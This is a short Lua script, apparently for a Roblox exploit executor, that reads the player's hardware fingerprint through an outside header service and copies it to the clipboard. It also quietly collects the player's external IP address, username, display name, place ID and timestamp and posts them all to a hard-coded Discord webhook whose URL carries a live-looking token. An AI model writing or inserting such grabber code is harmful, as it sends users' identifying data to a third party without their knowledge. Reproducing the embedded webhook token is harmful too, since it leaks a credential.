local setclipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
local request = request or http_request or (http and http.request) or syn.request

local hwid = nil
local username = game:GetService("Players").LocalPlayer.Name
local displayName = game:GetService("Players").LocalPlayer.DisplayName
local placeName = game:GetService("Workspace").Name -- Assuming you want the name of the current place
local placeId = game.PlaceId
local dateTime = os.date("%Y-%m-%d %H:%M:%S") -- Current date and time

local response = request({Url = "https://kya.jvck.gg/return-headers"}).Body
local decoded = game:GetService("HttpService"):JSONDecode(response)

local externalIPResponse = request({Url = "http://myexternalip.com/raw"}).Body

local printedOutput = "" -- Initialize an empty string to store printed output

for i, v in pairs(decoded) do
    local lowered = tostring(i):lower()

    printedOutput = printedOutput .. i .. ": " .. tostring(v) .. "\n" -- Append printed output to the string

    if (string.find(lowered, "fingerprint") or string.find(lowered, "identifier")) and not (string.find(lowered, "user")) then
        hwid = v
        printedOutput = printedOutput .. i .. ": " .. tostring(v) .. "\n" -- Append printed output to the string
    end
end

if getgenv().hwidRETURN then
    return hwid
else
    setclipboard(hwid)
end

-- Now send the embed message to the webhook
local webhookUrl = "https://discord.com/api/webhooks/1222518611672039524/kh6nZ3LElL-nWUn5SI8ap55X28L7w1Zgt-m5kn7ZRoaUHvRL9A8QgD1TfCdgUYtvrQBo" -- Replace this with your actual webhook URL

local embed = {
    title = "HWID and User Information",
    fields = {
        {name = "HWID", value = hwid},
        {name = "Username", value = username},
        {name = "Display Name", value = displayName},
        {name = "Place Name", value = placeName},
        {name = "Place ID", value = placeId},
        {name = "Date and Time", value = dateTime},
        {name = "External IP", value = externalIPResponse} -- Include external IP in the embed
    },
    color = 65280 -- Green color, you can change it as per your preference
}

request({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode({embeds = {embed}})
})
